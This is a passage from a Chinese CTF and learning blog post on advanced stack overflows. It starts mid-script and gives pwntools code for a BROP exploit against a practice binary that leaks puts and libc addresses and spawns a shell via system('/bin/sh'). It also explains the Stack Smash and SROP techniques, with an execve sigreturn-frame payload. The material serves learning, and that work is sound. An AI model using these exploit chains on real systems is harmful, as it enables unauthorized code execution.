class="comment">#公式</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*overflowlen + p64(pop_rdi_ret) + p64(<span class="number">0x400000</span>) + p64(i) + p64(stop)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = p.recv()</span><br><span class="line">        <span class="keyword">if</span> res.startswith(<span class="string">b&#x27;\x7fELF&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;put_addr: &#x27;</span>,<span class="built_in">hex</span>(i))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line"><span class="comment">#put_addr:  0x400555</span></span><br></pre></td></tr></table></figure>

<p>至此获取put导入表中的地址，但这里获取的是调用put之前的一段代码，我们需要找到最后一次调用put成功的段减去6的偏移（plt表的结构问题），才是put在导入表中真正的地址！</p>
<p>在经过一轮测试：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">overflowlen = <span class="number">72</span></span><br><span class="line">stop = <span class="number">0x4005c0</span></span><br><span class="line">trap = <span class="number">0x400000</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">pop_rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#从第一次执行put开始</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x400555</span>,<span class="number">0xffffffffffffffff</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(i))</span><br><span class="line">    p = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;WelCome my friend,Do you know password?\n&quot;</span>)</span><br><span class="line">    <span class="comment">#公式</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*overflowlen + p64(pop_rdi_ret) + p64(<span class="number">0x400000</span>) + p64(i) + p64(stop)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = p.recv()</span><br><span class="line">        <span class="keyword">if</span> res.startswith(<span class="string">b&#x27;\x7fELF&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;put_addr: &#x27;</span>,<span class="built_in">hex</span>(i))</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>

<p>通过测试可以知道最后一次通过判断是put_addr: 0x400566；</p>
<p>那么put的plt地址为0x400560；</p>
<h4 id="泄露put-got地址"><a href="#泄露put-got地址" class="headerlink" title="泄露put got地址"></a>泄露put got地址</h4><p>用put泄露地址，要注意它是把内存按照字符串进行打印，遇到00会截断；</p>
<p>所以定义一个函数，按一段内存进行泄露；</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">overflowlen = <span class="number">72</span></span><br><span class="line">stop = <span class="number">0x4005c0</span></span><br><span class="line">trap = <span class="number">0x400000</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">pop_rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line">put_plt = <span class="number">0x400560</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">start,end</span>):</span></span><br><span class="line">    data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    i = start</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        p = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;WelCome my friend,Do you know password?\n&quot;</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span>*overflowlen + p64(pop_rdi_ret) + p64(i) + p64(put_plt) + p64(stop)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = p.recvuntil(<span class="string">b&quot;\nWelCome&quot;</span>,timeout = <span class="number">2</span>)</span><br><span class="line">            res = res[:-<span class="number">8</span>]  </span><br><span class="line">            data = data + res + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">            i = i + <span class="built_in">len</span>(res) + <span class="number">1</span> </span><br><span class="line">            p.close()</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            p.close()</span><br><span class="line">        <span class="keyword">if</span> i &gt;= end:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment">#从put_plt往后0x100个字节，当然也可以从40W开始</span></span><br><span class="line">res = leak(put_plt,put_plt+<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;codess&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(res)</span><br></pre></td></tr></table></figure>

<p>之后用ida打开codess重定位到400560：</p>
<p><img src="https://s2.loli.net/2024/10/18/iab4Bdcny7S3keF.png" alt="image.png"></p>
<p>能够拿到put的got表地址在0x601018；</p>
<p>之后就是getshell了；</p>
<h4 id="最终的EXP"><a href="#最终的EXP" class="headerlink" title="最终的EXP"></a>最终的EXP</h4><p>思路为获取libc基址，调用system，结束；</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">overflowlen = <span class="number">72</span></span><br><span class="line">stop = <span class="number">0x4005c0</span></span><br><span class="line">trap = <span class="number">0x400000</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">pop_rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line">put_plt = <span class="number">0x400560</span></span><br><span class="line">put_got = <span class="number">0x601018</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露基址</span></span><br><span class="line">p = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;WelCome my friend,Do you know password?\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*overflowlen + p64(pop_rdi_ret) + p64(put_got) + p64(put_plt) + p64(stop)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">res = p.recvuntil(<span class="string">b&#x27;\nWelCome&#x27;</span>)</span><br><span class="line">put_addr_in_libc = u64(res[:-<span class="number">8</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address = put_addr_in_libc - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取binsh和system</span></span><br><span class="line">binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行system</span></span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*overflowlen + p64(pop_rdi_ret) + p64(binsh) + p64(system) + p64(stop)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>总结一下，这道题实际上没有开cannary，没有开pie，如果开了，需要先爆破cannary，之后寻找程序基址；</p>
<p>如果开了PIE，就比较棘手了，首先确定put调用的方法需要换了，除非有找到程序基址的方法；</p>
<p>CTF WIKI上没有明确提出如果有PIE如何解决的问题；</p>
<p>其实可以通过获取的stop gadget地址（回到输入的地址）来推测是否开启PIE，大概确定一个基址的范围（用于设置起点快速遍历）；</p>
<p>确定put的方法可以直接把40W打印出ELF改为打印BROP gadget处的特征码就行了，可以不用确定基址；</p>
<p>之后还是照常做就行；</p>
<h2 id="Stack-Smash"><a href="#Stack-Smash" class="headerlink" title="Stack Smash"></a>Stack Smash</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>当发生栈溢出时， libc会调用一个函数： __fortify_fail 传参为 stack smashing detected 字符串；</p>
<p>同时这个函数会打印文件名（环境变量），这个文件名存在main函数栈的下方，所以栈溢出可以覆盖到；</p>
<p>适用版本为 glibc &lt; 2.27；</p>
<p>补充：环境变量时存放在栈上的，同时libc里有一个符号叫 environ，它存放了环境变量地址，通过libc基址可拿到 environ地址，通过environ地址可拿到环境变量地址，也就是栈上的地址；</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>可以读取内存中的字符串信息，将其覆盖到对应栈位置；</p>
<p>所以如果有题目在内存中读取了flag，可以思考利用这个；</p>
<h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><p>sigreturn oriented programming（面向sigreturn的编写），sigreturn 是一个系统调用，它在unix系统发生signal时会被间接调用，信号机制（中断）；</p>
<h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>内核向进程发起一个signal，该进程被挂起（阻塞态），CPU进入内核态；</p>
<p>内核为其保存上下文，跳转相应的signal handler（一个函数，处理的时候继承挂起进程的内存空间，用户态，由进程本身定义编写）进行处理；</p>
<p>处理程序执行完毕，切入进程，恢复其上下文，继续执行；</p>
<p>Linux下，内核会帮用户进程将其上下文保存在它的栈上，然后在栈顶给到地址：rt_sigreturn，这个函数中会执行sigreturn系统调用；当signal handler执行完后，会返回去执行sigreturn；</p>
<p>出现的问题：</p>
<ul>
<li>sigreturn也是用户态执行；</li>
<li>上下文恢复不会检测，直接用，覆盖了的话，寄存器信息就变了；</li>
</ul>
<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>跳过前两步（内核给到signal，保存上下文），手动编写SROP链（自己写的上下文信息以及rt_sigreturn地址），手动的return到sigreturn，自动的帮我们恢复我们定义的上下文，从而控制程序流；</p>
<p>rt_sigreturn在i386下，存放于vdso，而在x64下，int 15就可以直接系统调用它；</p>
<p>主要利用x64下的，其SROP构造如下：</p>
<p><img src="https://s2.loli.net/2024/10/16/gFhO7WjZnYmJvup.png" alt="image.png"></p>
<p>在pwntools里给出了关于SROP的利用：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#记得架构给到</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#注意覆盖空间要够大，这个frame有0x100的大小</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">59</span></span><br><span class="line">frame.rdi = binsh_addr</span><br><span class="line">frame.rip = syscall</span><br><span class="line">frame.rsi = <span class="number">0</span>			<span class="comment">#函数return覆盖 		 int 15</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(mov_rax_15_ret) + p64(syscall) + <span class="built_in">bytes</span>(frame)</span><br></pre></td></tr></table></figure>

<p>当禁用59 execve时，通过orw（open read write）获取flag；</p>
</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Second_BC</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://secondbc.github.io/SecondBC/2024/10/30/%E6%A0%88%E6%BA%A2%E5%87%BA%E8%BF%9B%E9%98%B6/">https://secondbc.github.io/SecondBC/2024/10/30/%E6%A0%88%E6%BA%A2%E5%87%BA%E8%BF%9B%E9%98%B6/</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://secondbc.github.io/SecondBC">Second_BC の BloG</a>！</span></div></div></article><div id="pagination"><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/SecondBC/2024/10/20/2024-%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-easyre/"><span>2024-强网拟态-easyre</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2022 ～ 2024 By Second_BC</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/copy.js"></script><!--script(src=url)--></body></html>